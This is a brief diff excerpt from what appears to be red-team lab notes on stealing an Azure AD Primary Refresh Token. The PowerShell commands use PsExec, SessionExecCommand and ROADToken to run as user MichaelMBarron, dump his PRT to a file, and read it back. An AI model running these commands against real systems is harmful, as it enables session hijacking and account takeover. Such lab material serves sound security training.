@@ -1303,3 +1303,8 @@ Finally, run ROADToken.exe in the context of MichaelMBarron using SessionExecCom
 ```
 Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student213\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\student213\SessionExecCommand.exe MichaelMBarron C:\Users\Public\student213\ROADToken.exe <nonce> > C:\Users\Public\student213\PRT.txt"}
 ```
+
+Alright show me the PRT:
+```
+Invoke-Command -Session $infradminsrv -ScriptBlock{cat C:\Users\Public\studentx\PRT.txt}
+```
